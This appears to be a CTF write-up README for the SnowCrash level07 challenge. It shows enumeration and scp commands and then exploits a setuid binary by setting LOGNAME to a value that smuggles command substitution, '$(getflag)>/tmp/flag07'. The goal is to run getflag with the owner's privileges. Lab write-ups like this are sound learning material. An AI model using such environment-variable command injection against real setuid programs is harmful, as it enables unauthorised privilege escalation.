## Project README: Finding flag07

Our routine: 
```bash
ls -la
find / -user flag07 -print 2>/dev/null
```
We decompiled the file after we dowloaded with command:
```bash
scp -P 4343 level07@localhost:/home/user/level07/level07 ~
```

We saw that program was using LOGNAME env parameter.
So the idea is to make this file run getflag cause in doing so we are not running getflag as user **level07** but as **flag07** since level07 file was created by **flag07**.

To do so, we setted up $LOGNAME as **getflag**.

Command line :

```bash
level07@SnowCrash:~$ export LOGNAME='$(getflag)>/tmp/flag07'
level07@SnowCrash:~$ ./level07
level07@SnowCrash:~$ cat /tmp/flag07
```

And VOILA

